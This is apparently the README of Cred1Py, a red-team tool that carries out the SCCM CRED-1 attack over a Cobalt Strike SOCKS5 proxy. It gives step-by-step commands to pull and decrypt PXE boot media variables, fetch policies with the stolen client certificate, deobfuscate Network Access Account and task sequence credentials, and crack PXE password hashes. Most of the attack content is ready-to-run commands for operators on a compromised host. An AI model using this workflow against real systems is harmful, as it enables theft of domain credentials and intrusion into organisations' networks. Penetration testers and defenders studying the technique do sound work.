## Overview

This project is an implementation to support performing the SCCM CRED-1 attack over a SOCKS5 connection (with UDP support), based on the original attack description from Misconfiguration Manager:

- https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-1/cred-1_description.md

## Installation

```
python3 -m venv env
source ./env/bin/activate
pip install -r requirements.txt
```

## Usage

To use Cred1Py:

Start a SOCKS5 proxy via your C2, for example, CS uses the command:

```
> socks 9090 socks5 enableNoAuth a b
```

Run the attack path with the explicit `attack` subcommand:

```
python ./main.py attack <target> <src_ip> <socks_host> <socks_port>
```

Where:

* Target - The SCCM PXE server IP
* SRC_IP - The IP address of the compromised server we are running the implant on
* SOCKS_HOST - The IP of the team server running SOCKS5
* SOCKS_PORT - The SOCKS5 port

To decrypt a previously downloaded `.boot.var` file with a known key:

```
python ./main.py decrypt <path_to_boot_var_file> <key_hex>
```

To extract a crackable SCCM hash directly from a local `.boot.var` file:

```
python ./main.py hash <path_to_boot_var_file>
```

### Policy Processing Commands

These commands need the **decrypted media variables XML** as input. This is the XML file
containing `_SMSTSMediaPFX`, `_SMSMediaGuid`, `SMSTSMP` etc — produced by `attack` or `decrypt` modes
(typically saved as `variables.xml` or `sccm.xml` in your loot directory). It is NOT the raw `.boot.var` file.

Retrieve policies from the MP and automatically fall back to local `.raw` processing:

```
python ./main.py policies <media_variables_xml> -o <output_dir> --fallback-local
```

Decrypt previously downloaded `.raw` policy blobs offline (no network required):

```
python ./main.py policies-local <media_variables_xml> -i <dir_with_raw_files> -o <output_dir>
```

Example:

```
python ./main.py policies-local ./loot/sccm.xml -i ./loot -o ./loot
```

The `-i` directory should contain one or more of these files (saved by `policies` mode):
- `NAAConfig.raw` — CMS-encrypted Network Access Account policy
- `TaskSequence_*.raw` — CMS-encrypted task sequence policies
- `CollectionSettings.raw` — CMS-encrypted collection variable policy

### Deobfuscating Credential Strings

SCCM policy fields marked `secret="1"` (NAA credentials, collection variables) use an obfuscation
scheme with embedded key material. To deobfuscate from a policy XML file or raw hex string:

```
python ./main.py deobfuscate ./loot/NAAConfig.xml
python ./main.py deobfuscate "8913000009B5D6E1..."
```

### Full Workflow

Typical end-to-end flow:

```bash
# 1. Run CRED-1 attack over SOCKS5 to get media variables
python ./main.py attack <target> <src_ip> <socks_host> <socks_port> -o ./loot

# 2. Retrieve policies from MP using PFX cert from media variables
python ./main.py policies ./loot/variables.xml -o ./loot --fallback-local

# 3. Or, if you already have .raw blobs, decrypt them offline
python ./main.py policies-local ./loot/variables.xml -i ./loot -o ./loot
```

Important operational note: `attack` mode will often only work reliably when run from inside the Cobalt Strike container on the CS teamserver (where SOCKS5 and UDP relay behavior matches your beacon routing path).

### Output Files

| File | Description |
|------|-------------|
| `variables.xml` / `sccm.xml` | Decrypted media variables (PFX cert, MP URL, site code) |
| `*_SMSTSMediaPFX.pfx` | Client auth certificate extracted from media variables |
| `NAAConfig.xml` | Decrypted NAA policy (may contain obfuscated credentials) |
| `TaskSequence_N.xml` | Raw task sequence policy wrapper (contains obfuscated TS_Sequence blob) |
| `<TS Name>-<AdvID>.xml` | Decrypted task sequence XML extracted from the above (contains plaintext creds) |
| `task_sequence_credentials.txt` | Summary of all credentials found, with source mapping |
| `CollectionSettings.xml` | Decrypted collection variable policy |

To help visualise the components referenced in the arguments:

![](./images/attack-overview.png)

Note: Due to the way that SOCKS5 works, the C2 server will need to be accessible on all ports to Cred1py as a second ephemeral port is opened as part of the relaying of UDP traffic. Easiest method is usually to just run Cred1py on the C2 server and target `localhost`.. but you do you!

## How It Works

High-level flow:

1. `attack` talks to SCCM PXE over SOCKS5/UDP and retrieves media variables.
2. Media variables are decrypted and written to `variables.xml` (includes MP/site/PFX data).
3. `policies` uses that identity context to request policy content from the Management Point.
4. If remote processing fails or is incomplete, `--fallback-local` (or `policies-local`) decrypts saved `.raw` blobs from disk.
5. Decrypted NAA/Task Sequence/Collection policies are parsed for credential material and written to output files.

Further reference: [Misconfiguration Manager](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-1/cred-1_description.md).

### Credential Recovery Paths

### No PXE password set (crypto key in DHCP response)

When no PXE password is configured, the DHCP response includes encrypted key material. Cred1Py derives the AES decryption key and decrypts the variables file automatically, printing the task sequence variables.

If the TFTP download fails (common over SOCKS5), Cred1Py will still output the derived key and the SMB path so you can download and decrypt manually:

```
download \\sccmserver.lab.local\REMINST\SMSTemp\BootFileName.boot.var
python3 main.py decrypt /tmp/BootFileName.boot.var <derived_key_hex>
```

### PXE password is set (no crypto key in DHCP response)

When a PXE password is configured, the DHCP response does NOT include crypto key material. Cred1Py extracts a hashcat hash from the variables file header. Depending on the media encryption algorithm, the hash format will be `$sccm$aes128$...` or `$sccm$aes256$...`.

For AES-256 SCCM hashes, use the fork that supports AES-256 SCCM modes:

- https://github.com/chryzsh/hashcat-6.2.6-SCCM

Crack the hash, then re-run with the `-p` flag:

```
python ./main.py attack <target> <src_ip> <socks_host> <socks_port> -p <cracked_password_hex>
```

If TFTP fails, download the file via SMB and decrypt locally:

```
download \\sccmserver.lab.local\REMINST\SMSTemp\BootFileName.boot.var
python3 main.py decrypt /tmp/BootFileName.boot.var <cracked_password_hex>
```

## Credits

* Christopher Panayi, the original researcher of CRED-1 and the PxeThief OG Tool - https://github.com/MWR-CyberSec/PXEThief
* Carsten Sandker and his awesome Pxethiefy.py Tool which this is based on - https://github.com/csandker/pxethiefy
